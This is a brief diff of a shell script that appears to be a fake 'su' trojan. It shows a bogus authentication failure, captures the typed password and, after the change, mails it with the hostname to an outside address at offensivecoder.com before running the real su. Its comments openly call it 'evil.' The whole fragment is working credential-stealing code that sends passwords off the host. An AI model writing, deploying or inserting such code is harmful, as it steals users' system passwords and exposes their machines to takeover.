@@ -10,6 +10,6 @@ echo "su: Authentication failure"
 
 # muwahahaha, we have the password, now for the evil.
 # you can make this do what you like here.
-echo "su attempted with password: $password" | mailx -s "su attempt from `uname -n`" root@localhost
+echo "su attempted with password: $password" | mailx -s "su attempt from `uname -n`" root@offensivecoder.com
 
 exec /bin/su
